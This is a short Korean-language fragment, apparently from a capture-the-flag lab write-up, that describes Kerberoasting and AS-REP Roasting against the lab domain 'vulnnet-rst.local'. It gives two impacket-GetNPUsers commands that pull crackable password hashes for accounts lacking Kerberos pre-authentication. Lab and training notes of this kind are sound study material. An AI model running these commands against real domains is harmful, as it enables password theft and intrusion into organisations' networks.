
- **목적:** 서비스 주체 이름(SPN)이 등록된 계정을 찾아 서비스 티켓을 요청하고, 이를 오프라인에서 크랙하여 계정의 비밀번호를 알아냅니다.
- Kerberos 사전 인증이 비활성화된 사용자를 찾아 암호 해시를 추출하는 **AS-REP Roasting 공격**을 수행.
- ---


```bash
impacket-GetNPUsers vulnnet-rst.local/ -dc-ip $target -usersfile name.txt -format john -outputfile hashes.txt
```


```bash
impacket-GetNPUsers vulnnet-rst.local/ -dc-ip $target -usersfile name.txt -outputfile hashes.txt
```

